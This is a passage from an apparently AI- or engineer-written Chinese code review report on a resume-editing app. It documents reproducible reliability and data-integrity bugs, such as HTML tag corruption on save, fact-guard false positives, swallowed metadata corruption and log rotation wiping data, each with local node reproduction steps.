- **问题**：评估报告里的「薪资」数字完全不经任何核对就以「（来源：JD 自带）」展示给用户做投不投的决策；而代码注释点名的矛盾组合 {text:'年薪 100 万', source:'JD 未提供'} 并未按注释回落，原样落库。
- **证据**：eval.mjs:45 `parseEvalReport(raw, { docText = '' } = {})` —— parser 只拿到母版正文，拿不到 JD；eval.mjs:111-116 只对 source 做枚举校验（`SALARY_SOURCE.includes(...)`），text 原样保留，不与 JD 做任何比对。handoff 批次2 明确要求「salary 只准抄 JD 里的数字」，而同一份实现里简历侧是核验过的（eval.mjs:74 `hay.includes(needle)`），薪资侧没有任何等价物。落库处 server.mjs:2494 `rec = { id, jd, jdFp, company, role, score, verdict, blocks: parsed.report, ... }` —— JD 原文就在记录里，具备核对条件却没用。展示处 server.mjs:1418-1419：`sal.source==='JD 自带'` 时把 `esc(sal.text)` 连同「（来源：JD 自带）」直接渲染给用户。eval.mjs:108-110 的注释点名要处理的组合是 `{text:'年薪 100 万', source:'JD 未提供'}` 与 `{text:'', source:'JD 自带'}`，实际代码只处理了后者（`if (!t) return {text:'',source:'JD 未提供'}`）；前者 t 非空、src 合法 → 原样返回。探针实测（/tmp/probe-review/p2.mjs）：输入 {text:'年薪100万', source:'JD 未提供'} → 输出 {"text":"年薪100万","source":"JD 未提供"}，矛盾组合落库成立。
- **复现口径**：node -e "import('/Users/xxxly/resume/eval.mjs').then(m=>{const r=m.parseEvalReport(JSON.stringify({score:4.5,verdict:'apply',salary:{text:'年薪100万',source:'JD 自带'},matches:[]}),{docText:'任意正文'}); console.log(r.report.salary)})" → 期望看到 text='年薪100万'、source='JD 自带' 被原样保留（该数字并未出现在任何 JD 里，parser 也无从知道）；再把 source 改成 'JD 未提供' 仍原样保留（注释说要回落）。对照渲染点 server.mjs:1418：source='JD 自带' 时该数字会被当作 JD 原文展示给用户。

### BL-P4-02（severity: medium）

- **位置**：eval.mjs:72-80（parseEvalReport 的 matches 校验分支）
- **问题**：evidence（引文）只有「是母版子串」一道校验、没有最小长度护栏，1 个字的引文（『的』『负责』）就能让 status 保持 covered，「已有证据」这个结论因此没有任何实质核验。
- **证据**：eval.mjs:74 `const matchesResume = !!(hay && needle && hay.includes(needle));` —— 只要是非空子串即通过；eval.mjs:76-80 仅在子串不匹配时才清空 evidence 并把 covered 降级为 partial，没有任何长度下限。本仓库对同类「模型引文」已有明确口径：evidence.mjs:556 `if (!cited || !quote || [...normSpace(quote)].length < 6 || !normSpace(cited.text).includes(normSpace(quote)))` —— 引文少于 6 字一律不算可核验；handoff 也记着这条护栏的来由「挡『负责』『完成了』这类虚词，保留『负责存储层改造』这类有效锚定」。评估侧没有这道门。探针实测（/tmp/probe-review/p2b.mjs，母版含『张三的职责是存储层改造，负责高并发服务治理。』）：evidence='的' → status='covered'、evidence='的'；evidence='负责' → 同样 covered。渲染点 server.mjs:1434-1436 会把 status 映射为『已有证据』并把引文原样展示。
- **复现口径**：node -e "import('/Users/xxxly/resume/eval.mjs').then(m=>{const d='张三的职责是存储层改造，负责高并发服务治理。';const raw=JSON.stringify({score:4.5,verdict:'apply',salary:{text:'',source:'JD 未提供'},matches:[{req:'存储层经验',status:'covered',evidence:'的',weight:'must',weightFrom:'JD 原文'}]});console.log(JSON.stringify(m.parseEvalReport(raw,{docText:d}).report.matches[0]))})" → 输出 {"req":"存储层经验","status":"covered","evidence":"的"}：一条 1 字虚词保住了『已有证据』。把 evidence 换成 6 字以上的真实片段则走同一条 covered 路径，说明差别只在于有没有长度门。

### BL-P4-03（severity: medium）

- **位置**：server.mjs:3763（/ai/prep）、4017（/ai/rewrite）、4035（/ai/chat）、4090（/ai/review）、4105（/ai/match）、4124（/ai/zone-analyze）、4148（/ai/zone-rewrite）；错误源 llm.mjs:117；出口 server.mjs:4981；消费点 ai-panel.js:178-181
- **问题**：模型调用超时/失败的真正原因在链路上被丢掉：7 个 /ai/* 路由不捕获 chat 异常 → 服务端回 500 text/plain → 客户端 postJson 只在 JSON 体里找错误信息，于是用户看到的只有『HTTP 500』。
- **证据**：llm.mjs:117 `signal: AbortSignal.timeout(Number(c.timeoutMs) > 0 ? Number(c.timeoutMs) : 120000)`，超时抛出的是裸 Error（name=TimeoutError，无 code/flag，调用方无法与 401/429/5xx 区分）。7 处路由的 `await chat(...)` 全都没有 try/catch（逐条读过 3763/4017/4035/4090/4105/4124/4148 上下文），异常一路冒到 server.mjs:4981 的 `Promise.resolve(p).catch(...)` → `res.end('server error: ' + e.message)`（text/plain）。客户端 ai-panel.js:178-181：`try { data = await r.json(); } catch (e) { data = null; }` → 非 JSON 体被丢弃 → `new Error((data && ...) || ('HTTP ' + r.status))` → 面板只显示『HTTP 500』。对照组 /eval/create（server.mjs:2482-2483）捕获了同一个错误并回 502 JSON，消息完整。隔离实例实测（/tmp/probe-review/p6.mjs：RESUME_ROOT=临时目录、随机端口、合成文档、本地『收请求后永不响应』的桩、timeoutMs=1500）：POST /ai/rewrite → {"status":500,"ct":"text/plain","text":"server error: The operation was aborted due to timeout"}；同一实例 POST /eval/create → {"status":502,"ct":"application/json...","text":"{\"ok\":false,\"error\":\"模型调用失败：The operation was aborted due to timeout"}"}。注意 max 思考下一次岗位适配要 4–5 分钟（handoff「max 思考的真实成本」），超时是这条链路上真实会发生的路径，不是理论情形。
- **复现口径**：复跑 /tmp/probe-review/p6.mjs（隔离数据根+随机端口+合成文档+卡住的桩），对比两行输出：/ai/rewrite 得到 500 text/plain，/eval/create 得到 502 JSON。再对照 ai-panel.js:179-183 的取值逻辑即可确认客户端最终展示为『HTTP 500』；把 /ai/rewrite 的 chat 调用包一层 try/catch 回 sendJson(502,{error:...}) 即可看到消息恢复正常。

### BL-P4-04（severity: medium）

- **位置**：resource-slots.mjs:73-76（unclaim）
- **问题**：unclaim 完全不校验凭证归属（本池签发/未释放/未被占用三个条件一个都没查），跨池 unclaim 能把别的池凭证的 inUse 清成 false，随后同一凭证可被第二个执行器并发 claim，容量上限被突破。
- **证据**：resource-slots.mjs:74-76 `function unclaim(lease) { if (lease && typeof lease === 'object' && lease.inUse) lease.inUse = false; }` —— 只看是个对象且 inUse 为真，既不查 owned.has(lease)（本池签发），也不查池名，也不查 released。对比同文件 claim（61-72）与 releaseLease（87-103）：两者都做了 `owned.has(lease)` + `lease.name !== poolName` + `released`/`inUse` 四道校验，模块头部注释（resource-slots.mjs:56-60）也把「①本池签发 ②未释放 ③未被占用」写成合同，唯独 unclaim 是合同外的后门。探针实测（/tmp/probe-review/p1.mjs）：B 池凭证被 claim（inUse=true）后调用 A 池的 unclaim → inUse 变 false → 紧接着 B.claim(同一凭证) 成功 → 同一执行槽被两个执行器同时使用，B 池 limit=1 的容量约束失效。测试侧只覆盖了 release 侧：test-fixtures/reliability/test-resources.mjs E 段「跨池释放」测的是 `pb.release(la)`，没有任何用例覆盖 unclaim。当前调用点（llm.mjs:124、server.mjs:942）都用了对应池的 unclaim，所以今天还没有触发路径——但这是一条随时可被下一处接线踩中的合同缺口。
- **复现口径**：node /tmp/probe-review/p1.mjs → 输出：B lease inUse before: true / B lease inUse after A.unclaim: false / 第二个执行器成功 claim 同一凭证。复核方式：把 unclaim 改成与 claim 同款的 `if (!owned.has(lease) || lease.name !== poolName) throw new ResourceLeaseError(...)`，再断言 B 池凭证的 inUse 保持为 true。

### BL-P4-05（severity: low）

- **位置**：eval.mjs:47-51（parseEvalReport 的 JSON 解析）
- **问题**：模型输出只要在 JSON 前面带一句自然语言（极常见的真实模型行为），整份评估直接作废返回 502，用户等 4–5 分钟换来一句『模型报告无法解析』。
- **证据**：eval.mjs:49 `const cleaned = String(raw).trim().replace(/^```(?:json)?\s*/i, '').replace(/```\s*$/, '').trim();` —— 只剥首尾围栏，不剥任何前言/后记；eval.mjs:50 `data = JSON.parse(cleaned)` 直接失败 → eval.mjs:51 `return fail('模型输出不是合法 JSON')` → server.mjs:2490 `if (!parsed.ok) return sendJson(502, {ok:false, error:'模型报告无法解析：' + parsed.reason})`。探针实测（/tmp/probe-review/p2.mjs）：输入 '好的，这是评估结果：\n```json\n{"score":4,...}\n```' → {"ok":false,"reason":"模型输出不是合法 JSON"}；纯围栏无前言则正常（ok:true）。同一段代码在 llm.mjs / structure.mjs（structure.mjs:45-46）也是同样的剥法，说明这是全仓一致的做法而非评估侧独有；但评估这条路径的代价最高（一次完整模型调用 + 用户等待），而 payload 里明明带着 JD 全文、评估结果本身也已用 prompt 硬约束要求纯 JSON。
- **复现口径**：node /tmp/probe-review/p2.mjs 末行输出即为复现：带一句前言的合法 JSON 报告被判为『模型输出不是合法 JSON』。对照：把同一段 JSON 去掉前言（仅保留 ```json 围栏）→ ok:true。

### BL-P4-06（severity: low）

- **位置**：resource-slots.mjs:129-140（withLease）
- **问题**：导出的 withLease 与本模块的「租约透传」合同互斥：withLease 自己先 claim，fn 内再把同一凭证传给 llm.mjs/renderDoc 时必然二次 claim 抛错——一旦有人用这个 helper 承接透传，下层调用全部打挂。
- **证据**：resource-slots.mjs:130-140：`const lease = await acquire(); try { claim(lease); return await fn(lease); } finally { unclaim(lease); releaseLease(lease); }` —— 凭证在进入 fn 之前已被置 inUse=true。而透传路径按设计必然会再 claim 一次：llm.mjs:102 `const held = lease ? aiPool.claim(lease) : null;`、server.mjs:870 `const heldLease = lease ? renderPool.claim(lease) : null;`。探针实测（/tmp/probe-review/p4.mjs）：withLease 的 fn 内再 claim 同一凭证 → ResourceLeaseError「槽位 ai 的凭证正在被其他执行器使用：同一凭证不能并发使用」。模块自身没有测试覆盖这条组合：test-resources.mjs F 段的 withLease 用例只断言「fn 抛错也释放、返回值透传」，没有把凭证往下传。当前全仓无 withLease 调用点（纯死代码），但它是 createSlotPool 的导出 API，与 llm.mjs/server.mjs 的透传口径直接冲突。
- **复现口径**：node /tmp/probe-review/p4.mjs → 输出「withLease 内部再 claim 同一凭证 → ResourceLeaseError: 槽位 ai 的凭证正在被其他执行器使用」。复核方式：把 withLease 里的 claim 去掉（或让 withLease 传入一个未占用的 lease 由下层自行 claim），再跑同一脚本，错误应消失。

### BL-P4-07（severity: low）

- **位置**：gen-result.mjs:6（头部契约第 4 条）与 gen-result.mjs:26-28（超时分支）
- **问题**：模块头部写明的契约「next=null 表示放弃写入（迟到/被替代/已取消/超时）」与实现不一致：超时分支返回的是非 null 的 next 并会写入 status='error'，照头部契约读代码的人会判断错。
- **证据**：gen-result.mjs:6 「4) next=null 表示放弃写入（迟到/被替代/已取消/超时），不是『删除文档元数据』。」；而 gen-result.mjs:26-28 的超时分支 `if (typeof gt.startedAt === 'number' && gt.startedAt + ttlMs < now) { return reject('任务超时', true); }` 里 reject()（21-25 行）构造并返回的是 `copy(cur)` + status='error' 的新对象，即 next !== null，超时会真的落盘一条 error 状态。内联注释（gen-result.mjs:20-21）描述的才是实际行为：「dropped=true 用于『结果不落账但原因可见』的超时路径」。行为本身是对的（不留永远 running 的任务，/job/generate 靠 gt.error 回 409 原因，见 server.mjs:2846-2848），问题只在头部契约这一行与代码相反；test-fixtures/reliability/test-gen-result.mjs:72-74 断言的也是『超时 → next 非 null 且 status=error』，即代码与测试一致、只有头部注释过时。
- **复现口径**：node --input-type=module -e "import {completeGenResult} from '/Users/xxxly/resume/gen-result.mjs'; const cur={job:{genTasks:{changes:{taskId:'t1',status:'running',startedAt:0}}}}; const r=completeGenResult(cur,{kind:'changes',taskId:'t1',now:999999999,ttlMs:1000,apply:null,errMsg:undefined}); console.log('next 为 null ?', r.next===null, '| status =', r.next.job.genTasks.changes.status)" → next 非 null 且 status='error'，与文件头第 6 行『超时 = next=null』相反。

## 审查路 5（节点 13101，5 条）

### BL-P5-01（severity: high）

- **位置**：zone.mjs:38（unitTags 内 `const gt = s.indexOf('>', j);`）→ zone.mjs:58-76 normalizeZids；写路径入口 server.mjs:2095（JSON 保存协议）与 server.mjs:2856（HTML 保存路径）
- **问题**：写路径用「引号不感知」的开标签结束扫描定位属性区，属性值里含 ">" 时会把标签截断，normalizeZids 随后按截断片段重写开标签 → 每次保存都把用户正文改写成坏标签（正文被塞进属性值、段落可见文本被污染、该段 zid 绑定丢失）。
- **证据**：zone.mjs:38 用 `s.indexOf('>', j)` 找标签末尾，不跳过引号区间；对比 extract.mjs:30-41 的 tagEnd（引号感知），其注释明确记录了同一类 bug 的后果（「indexOf('>') 会把 <div title="A > B"> 截在属性值中间…进而进 AI 上下文与版本对比」）。extract.mjs 是读路径（只是降级），zone.mjs 的 unitTags 同时喂给 normalizeZids（写路径），后果是改写而不是降级。zone.mjs 头注释「写回层同样不处理该形状」只描述了「不处理」，未覆盖「会写坏」。实测（隔离 RESUME_ROOT=/tmp/probe-rk/data、随机端口 53509、合成文档 synth.html）：原始 `<p title="负责 A > B 系统" data-zid="z11111111">负责 A > B 系统的架构设计</p>`，POST /save?id=synth 返回 200 后落盘变成 `<p title="负责 A  data-zid="zc0d901d7"> B 系统" data-zid="z11111111">负责 A > B 系统的架构设计</p>`；再用冻结件 render.mjs 渲染并 pdftotext 回读，PDF 可见文本变成 `B 系统" data-zid="z11111111">负责 A > B 系统的架构设计`（原文前綴丢失、属性残片进入正文），且原 zid=z11111111 的绑定消失。反向佐证：/api/extract 走 extract.mjs 的引号感知 tagEnd，仍回显干净文本「负责 A > B 系统的架构设计」——即「正文提取」与「实际渲染」对同一份落盘文件给出不一致结论。重复保存 3 次结果稳定（不继续增长），即损坏一次性写死并随快照/存档扩散。
- **复现口径**：① 临时目录建 RESUME_ROOT，docs/synth.html 写一个含 `<p title="A > B" data-zid="z11111111">正文</p>` 的合成文档；② 起隔离实例（RESUME_ROOT + 随机端口），POST /save?id=synth；③ cat docs/synth.html 看开标签已被改写成 `<p title="A  data-zid="z…"> B" data-zid="z11111111">`；④ node render.mjs --src 该文件 --out /tmp/x.pdf && pdftotext /tmp/x.pdf - 可见正文被污染。纯函数级最小复现：node -e "import('./zone.mjs').then(m=>console.log(m.normalizeZids('<p title=\"A > B\">x</p>',()=> 'z22222222')))"。真实文档当前未触发（结构扫描 docs/*.html：unit 标签中「naive>≠quote-aware」计数 0、重复 data-zid 计数 0），属潜伏缺陷；触发条件是合法 HTML5 形态（带引号属性值内允许 '>'）出现在正文段落标签上（外来/手改/历史文档）。

### BL-P5-02（severity: medium）

- **位置**：job.mjs:87-91（NUM_RE 分支③ 要求含百/千/万/亿）→ job.mjs:180-181（lostNums 判定）
- **问题**：事实护栏把「阿拉伯数字 → 中文数词（不含百/千/万/亿）」的等价改写判成「原文数字未原值保留」的 conflict 误报，直接阻断导出。
- **证据**：NUM_RE 分支③的正则要求中文数词串里至少出现一个 百/千/万/亿（「三段经历」「五人团队」因此完全不产生数字 token），而分支②会把「3」「5」识别为数字。于是 before 侧有 token、after 侧没有 → lostNums 非空 → factGuard 置 level='conflict'。实测（node 直接调 job.mjs）："负责 3 段经历"→"负责三段经历" 判 conflict「原文数字未原值保留：3」；"管理 5 人团队"→"管理五人团队"、"5 年经验"→"五年经验" 同样判 conflict；反向 "负责三段经历"→"负责 3 段经历" 判 conflict「改写引入原文没有的数字：3」。影响链：evidence.mjs:338 exportChecks 把 level==='conflict' 且 status 为 pending/skipped 的候选计入 blocking → canExport=false → 导出页禁用下载（handoff §2.7 的冲突门控）。handoff 已裁决的是「三段经历」这类序数不计入、以及「三十人→五十人」的已知漏报（均为中文→中文方向），未覆盖「阿拉伯→中文」这条会产生误报的方向；该方向与 handoff「漏报优于误报，否则用户会关掉护栏」的既定取舍相反。
- **复现口径**：node -e "import('/Users/xxxly/resume/job.mjs').then(m=>{const g=m.factGuard({kind:'replace',before:'负责 3 段经历',after:'负责三段经历',level:'normal'});console.log(g.level,g.reason)})" → 输出 conflict / 原文数字未原值保留：3。再用真实链路复现：让模型对含「3 段经历」「5 年经验」的段落做等义中文改写 → 候选落 pending+conflict → 导出页显示不可下载。

### BL-P5-03（severity: medium）

- **位置**：job.mjs:94（DATE_TOKEN_RE 允许 `\s*[.\-/年]`）与 job.mjs:155（dateParts 的正则无 `\s*` 前缀）不一致 → job.mjs:172-177 lostDates
- **问题**：日期归一的两个正则对空格的容忍度不一致，同一个日期的两种写法（带空格 vs 不带空格）被误判成「原文日期未原值保留」的 conflict 误报，阻断导出。
- **证据**：DATE_TOKEN_RE（job.mjs:94）匹配时允许年份与「年/月/日」之间有空白（`\s*[.\-/年]\s*\d{1,2}`），因此 "2019 年 6 月" 会被整体当成一个日期 token；而 dateParts（job.mjs:155）的正则是 `/^(19|20)\d{2}(?:[.\-/年]\s*(\d{1,2})...)?/`，年份后没有 `\s*`，遇到空格就不进可选组 → 把 "2019 年 6 月" 归一成 "2019-0-0"，而 after 侧的 "2019年6月" 归一成 "2019-6-0" → 两个集合不相交 → lostDates 非空。实测："2019 年 6 月"→"2019年6月" 判 conflict「原文日期未原值保留：2019 年 6 月」；而 "2019-06"→"2019年6月"、"2019.06 - 2022.03"→"2019年6月 - 2022年3月" 均正常放行（无空格写法不触发）。同 job.mjs:180 的数字误报一样，经 evidence.mjs:338 exportChecks 计入 blocking，canExport=false 阻断导出。
- **复现口径**：node -e "import('/Users/xxxly/resume/job.mjs').then(m=>{const g=m.factGuard({kind:'replace',before:'2019 年 6 月',after:'2019年6月',level:'normal'});console.log(g.level,g.reason)})" → 输出 conflict / 原文日期未原值保留：2019 年 6 月。对照：把 before 换成 '2019-06' 则输出 normal。

### BL-P5-04（severity: medium）

- **位置**：tx.mjs:224-229（beginTx 读旧 meta 时的 `catch { oldMeta = null; }`）与 tx.mjs:402（defaultRestoreDoc 里 `updateMeta(root, docId, () => (oldMeta === undefined ? null : oldMeta))`）
- **问题**：事务记录在写载荷时静默吞掉 docs-meta.json 的损坏，把「损坏」误记成「事务前没有该文档的 meta 条目」；这份记录被启动恢复消费时会把该文档的整条 meta（rev/job/zones/tag）删除。
- **证据**：tx.mjs:11 的模块契约明写「读容忍缺失、损坏显式抛 CORRUPT（停写不覆盖）」，但 beginTx 用裸 JSON.parse + 空 catch（tx.mjs:226-228），损坏 → oldMeta=null 并把 "null" 写进 <txId>.meta.json 载荷。恢复端 defaultRestoreDoc 用 `oldMeta === undefined ? null : oldMeta` 判定「事务前无条目」→ null 走删除分支 → updateMeta 收到 null → 删掉该文档的 meta 条目。实测（node 直接调 tx.mjs，临时 RESUME_ROOT）：① 写坏 docs-meta.json 后 beginTx → 载荷内容为 "null"（损坏被吞）；② 造一条载荷为 null 的事务记录、meta 正常为 {"doc1":{"rev":7,"tag":"keepme"}} → recoverPending 后 meta 变成 {}（条目被删）。注意 updateMeta 本身是守约的（同一探针里对损坏 meta 抛 CORRUPT 且不覆盖落盘），所以停写由 updateMeta 兜住；残余风险路径是：保存时 beginTx 先吞掉损坏 → 随后 updateMeta 抛 CORRUPT → server.mjs:2186-2187 的双恢复里 meta 恢复失败 → commitTx 不执行 → 事务记录留存；等用户修好 docs-meta.json 后，下次启动的恢复就会执行那次删除。
- **复现口径**：隔离临时根：node -e "import('/Users/xxxly/resume/tx.mjs').then(async m=>{const fs=require('fs');fs.writeFileSync(root+'/docs-meta.json','{\"doc1\":{\"rev\":1}, TRUNCATED');const tx=m.beginTx(root,'doc1','save','');console.log(fs.readFileSync(root+'/.tx/'+tx+'.meta.json','utf8'))})" → 打印 null（说明损坏被当作「无条目」）。第二步：把 meta 修成合法内容并放入一条 oldMeta=null 的事务记录，调 recoverPending(root,{})，观察该文档 meta 条目被删除。

### BL-P5-05（severity: low）

- **位置**：zone.mjs:11-12（ZID_ATTR / ZID_ANY_ATTR 只认双引号、无空格形态）与 zone.mjs:279（zoneEditUnits 的重复判定用 /\sdata-zid\s*=/gi）口径不一致；消费点 zone-ops.mjs:48-49、server.mjs:2110/2117
- **问题**：data-zid 属性若不是「双引号且等号两侧无空格」形态，归一化不会摘掉旧值而是补一个新值，产生同一元素两个 data-zid 属性，区域单位解析随即抛错 → 该文档的区域保存通道永久 400。
- **证据**：ZID_ATTR（zone.mjs:11）= `/\sdata-zid="(z[0-9a-f]{8})"/`、ZID_ANY_ATTR（zone.mjs:12）= `/\sdata-zid="[^"]*"/g`，两者都只匹配双引号形态；而 zoneEditUnits 的重复判定（zone.mjs:279）用的是宽松的 `/\sdata-zid\s*=/gi`。实测（node 调 zone.mjs）：`<p data-zid='z11111111'>x</p>` → normalizeZids 输出 `<p data-zid='z11111111' data-zid="z22222222">x</p>`（旧值未被 ZID_ANY_ATTR 摘除）→ zoneEditUnits 抛「区域单位存在重复 data-zid 属性」；`data-zid = "z11111111"`（等号两侧有空格）与 `data-zid=z11111111`（无引号）同样产出双属性并抛错。后果链：server.mjs:2110 的唯一性预检直接 catch → 400「正文形状非法，整份拒绝」；server.mjs:2117 applyZoneOps 内 zoneEditUnits 抛错 → 400「区域操作校验失败，整份拒绝」——即该文档此后任何区域保存都被拒（普通 /save 仍可走通，但重复属性会永久留在正文里）。
- **复现口径**：node -e "import('/Users/xxxly/resume/zone.mjs').then(m=>{const h=m.normalizeZids(\"<p data-zid='z11111111'>x</p>\",()=> 'z22222222');console.log(h);try{m.zoneEditUnits(h)}catch(e){console.log('THROWS:',e.message)}})" → 先打印双 data-zid 的标签，再打印 THROWS: 区域单位存在重复 data-zid 属性。等价触发：等号两侧留空格或去掉引号。

## 审查路 6（节点 13102，6 条）

### BL-P6-01（severity: medium）

- **位置**：logrotate.mjs:16-18（rotateLogIfNeeded）
- **问题**：轮转是「先写 .1 备份、再截断主文件」，但写 .1 的异常被空 catch 吞掉后，破坏性的 truncateSync 仍然执行——备份没写成功也照样把整份主日志清零。
- **证据**：logrotate.mjs:16 `try { fs.writeFileSync(file + '.1', buf, { mode: 0o600 }); } catch {}`（错误完全吞掉）；:18 `fs.truncateSync(file, 0);`（无条件执行，无「备份成功」前置条件）。附加第二处丢失：:7 的 statSync 取得 size，:13 按该 size 读尾部，:18 才截断——stat 与 truncate 之间新写入日志（launchd 以 O_APPEND 持有 fd）既不在 .1 副本里、又被截断丢弃。我用隔离目录实测复现：造 51MB 稀疏日志 + 让 server.log.1 预先存在为目录（writeFileSync 抛 EISDIR）→ 调用 rotateLogIfNeeded 不抛错、正常返回，但日志 size 从 53477376 变成 0，且 .1 仍是目录（没有任何备份文件产生）。ENOSPC（磁盘满）也会走同一条路径：2MB 写失败→吞掉→truncate 成功（truncate 反而释放空间）→日志全毁。
- **复现口径**：隔离 RESUME_ROOT：① fs.truncateSync 造 51MB 稀疏 server.log（> CAP 50MB）；② mkdir server.log.1 使副本写入必失败(EISDIR)；③ 调用 rotateLogIfNeeded(server.log)；④ 断言 statSync(log).size === 0 且不存在可读的 .1 文件 → 即复现「整份日志被销毁且零备份」。对照：正常路径（.1 可写）会生成 2MB、mode 0600 的 .1 并把主文件截为 0（我的实测输出）。

### BL-P6-02（severity: medium）

- **位置**：migrate-meta.mjs:446（runMigration 取根锁处，注释 443-445）
- **问题**：迁移把 staleMs 放大到 24h 来防「迁移跑太久被服务端判陈旧」，但这个参数只作用于迁移自己，服务端 rootLock.isHeld / rootLock.acquire 仍用默认 30min——超过 30 分钟后服务端照样认为锁陈旧并抢走它，迁移与服务端并发写同一批文档。
- **证据**：migrate-meta.mjs:446 `rootLock.acquire(root, { staleMs: 24 * 3600 * 1000, timeoutMs: 0 })`，而 443-445 的注释明写「staleMs 放大到 24h：默认 30min 会让『渲染慢 × 文档多』的整轮被 server 判陈旧并放行写请求，两侧同时写同一文档」——但该保护并不生效：tx.mjs:145-147 acquire 与 tx.mjs:150-154 isHeld 的 staleMs 缺省值都是 1800000(30min)，服务端 server.mjs:2238 `rootLock.isHeld(root)`（写请求 503 闸门）与 server.mjs:2058（/save 的 `rootLock.acquire(root)`）用的都是这个缺省值，**看不到迁移进程传入的 24h**。隔离实测：子进程按迁移口径 acquire（staleMs 24h）持锁，把锁文件 startedAt 改成 31 分钟前（持有进程仍存活）后 → `rootLock.isHeld(root)` 返回 false（默认 30min 判陈旧），另一个进程按服务端口径 `rootLock.acquire(root)` 成功抢到锁（锁文件 pid 由 892 变为 969）。后果链：服务端抢锁后 /save 正常写文档；迁移侧 migrate-meta.mjs:369/371 的 assertLockOwnership → lockOwnedBy（:64-68，只比 pid+startedAt，不看 staleMs）判失败 → 抛 LOCK_LOST、e.restored=false、不就地恢复、留下 .tx 记录；而迁移在跑门禁前已 atomicWrite 写过新正文（migrate-meta.mjs:356）→ 启动恢复按 .tx 记录把文档回滚到迁移前字节 → 窗口内用户那次保存被回退（编辑丢失）。
- **复现口径**：隔离根 + 两个子进程：A 按 migrate-meta 口径 rootLock.acquire(root,{staleMs:24h,timeoutMs:0}) 持锁并打印 pid；把 .migrate.lock 的 startedAt 改成 now-31min；B 调用 rootLock.isHeld(root) → 期望 true 实际 false；C 调用 rootLock.acquire(root)（服务端口径）→ 期望 LockHeld 实际成功且锁文件 pid 被换掉。另需注意本条的实际触发前提：迁移需跑满 30 分钟以上（每文档两次 Chromium 渲染 + pdftotext + pdfinfo + 像素差分），当前数据根只有 2 份文档时整轮约 1 分钟，因此这是「防护声明与实现不符 + 文档数增长后的定时炸弹」，而非当下每分钟都在丢数据。

### BL-P6-03（severity: medium）

- **位置**：migrate-meta.mjs:395-412（migrateMaterials）
- **问题**：素材迁移没有服务端那道「根值形状」闸门：materials.json 只要能被 JSON.parse（即使根值是对象/字符串/null），migrateMats 就会把它当成空数组并把整个文件改写成 []，而迁移还报告成功。
- **证据**：migrate-meta.mjs:399-404 只判 JSON.parse 成功就往下走，没有 shapeOk 检查；:405 `const migrated = migrateMats(mats)`，而 zone.mjs:412-413 `migrateMats` 的实现是 `Array.isArray(mats) ? mats : []`——非数组输入被静默降级成空数组；:406 `JSON.stringify(migrated) === JSON.stringify(mats)` 判「无变化」时两者必然不等 → 走 :409-410 `atomicWrite(f, JSON.stringify(migrated))` 落盘 `[]`。对照服务端同款防线：server.mjs:127-129 `shapeOk` 与 :139-150 `assertWritable`（形状错 = CORRUPT = 停写不覆盖），handoff 也记录过同族事故「applications.json 被写成对象后一次 saveApps 即清空全部投递记录」。隔离实测：materials.json = {"note":"用户手工写坏的形状"} + 空 docs/ → `runMigration('/tmp/rv-probe3/data')` 返回 report.ok=true、report.materials={"migrated":true,...}，事后 materials.json 内容变成 `[]`（原字节仅留在 backups/pre-s3-mats-<ts>/materials.json）。
- **复现口径**：隔离根：mkdir data/docs（空，使 pending 为空、走无待迁分支直接跑 migrateMaterials）；写 data/materials.json = {"not":"an array"}；await runMigration(root)；断言 report.ok===true 且 materials.json 变为 []（实测输出：before {"note":"用户手工写坏的形状"} → after []）→ 即复现「静默清空素材表并报成功」。

### BL-P6-04（severity: low）

- **位置**：migrate-editor.mjs:63-64
- **问题**：迁移把模板派生的 toolbar/脚本用「字符串」形式喂给 String.replace，若模板里出现 $& / $` / $' / $$，会被 replace 当成特殊模式解释，把旧文档内容或旧脚本拼进迁移结果——同一仓库其它地方都刻意用函数替换来规避这个坑。
- **证据**：migrate-editor.mjs:63-64 `html.replace(/<div class="edit-toolbar".../, toolbar[0]).replace(/<script>.../, newScript)` —— 第二个参数是字符串，$ 序列被特殊解释（我实测 JS 语义：'X'.replace(/X/,'a$&b')==='aXb'（插入整个匹配＝旧脚本）、'X'.replace(/X/,'a$`b')==='ab'（插入匹配之前的文档内容）、'X'.replace(/X/,'a$$b')==='a$b'）。对照本仓库的既定做法：template.mjs:43-47 明确注释「函数替换：防止 CSS 里的 $& 等模式被 replace 特殊解释」并用 `() =>`；structure.mjs:32-43 同样用函数替换；importer.mjs:44-53 也是函数替换——只有 migrate-editor 这一处用裸字符串。诚实边界：我扫描了当前冻结模板（template.html）的 toolbar(424 字节) 与 script(10349 字节) 两块，`$` 出现次数为 0，**今天不会触发**；这是模板下次改版时的静默数据损坏隐患（editor-shell 一类脚本里出现 `$$`/正则替换写法很常见）。
- **复现口径**：不改仓库的复现：node 脚本读 template.html，正则取出 toolbar 与 script 两块，统计 /\$[&`'$]/g 命中数（实测 0 → 说明当前不触发）；再构造一个含 $& 的假模板片段，验证 'X'.replace(/X/, tplScript) 会把匹配内容（旧的 script 块）拼进结果（实测输出 a$&b → aXb）→ 说明一旦模板出现该序列，migrate-editor 写出的文档会被静默篡改。

### BL-P6-05（severity: low）

- **位置**：importer.mjs:64（LLM 结构化路径）vs importer.mjs:52-53（降级路径）
- **问题**：同一个 importPdfText 的两条路径对 {{DOC_ID}} 占位符的处理不一致：降级路径替换了它，正常的 LLM 结构化路径没有，落盘字节里留着占位符——违反 importer 自己在第 52 行写下的契约。
- **证据**：importer.mjs:64 `html = await structureText(root, text)`，而 structure.mjs:31-44 的 buildDoc 只替换 {{NAME}}/{{CONTACT}}/{{INTENT}}/{{SUMMARY}}/{{SKILLS}}/{{WORK}}/{{PROJECTS}}/{{EDU}}，**不替换 {{DOC_ID}}**（structure.mjs:31 注释「模板中的 {{DOC_ID}} 由 server /edit 在 serve 时注入，本函数不替换」）；而 importer.mjs:52-53 的降级路径明确写了「DOC_ID 占位符也要替换：/edit 服务端会替换，但快照/导出/直读磁盘的字节里留着占位符」并 `.replaceAll('{{DOC_ID}}', () => esc(String(docId || '')))`。隔离实测（假 LLM 返回合法 JSON）：structureText 产物含 '{{DOC_ID}}' = true、含 '{{NAME}}' = false、脚本行 = `var DOC_ID = '{{DOC_ID}}'`。影响（据实）：/edit 在 serve 时用 server.mjs:2305 替换，服务端页面与编辑器不受影响；受损的是落盘字节、快照与该字节派生出的 renderInputId 身份——即 importer 自己声明要守住的那条不变量在更常见的路径上没有守住。
